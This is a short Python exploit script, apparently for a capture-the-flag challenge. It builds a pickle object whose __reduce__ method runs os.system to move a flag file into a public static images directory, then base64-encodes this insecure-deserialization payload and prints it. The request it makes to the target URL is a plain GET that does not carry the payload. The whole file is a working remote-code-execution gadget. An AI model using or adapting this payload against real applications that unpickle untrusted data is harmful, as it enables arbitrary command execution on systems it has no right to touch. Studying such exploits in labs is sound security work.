#!/usr/bin/python3

import requests
import base64
import pickle
import sys
import os
from pprint import pprint


class RCE:
    def __reduce__(self):
        cmd = 'mv /app/challenge/flag.txt /app/challenge/application/static/images/flag.txt'
        return os.system, (cmd, )




if __name__ == "__main__":
    main_url = sys.argv[1]
    pickled = pickle.dumps(RCE())
    data = base64.urlsafe_b64encode(pickled)

    print(f"[*] this is the data {data.decode()}")
    sess = requests.Session()
    ress = sess.get(url=main_url)

    pprint(ress.text)

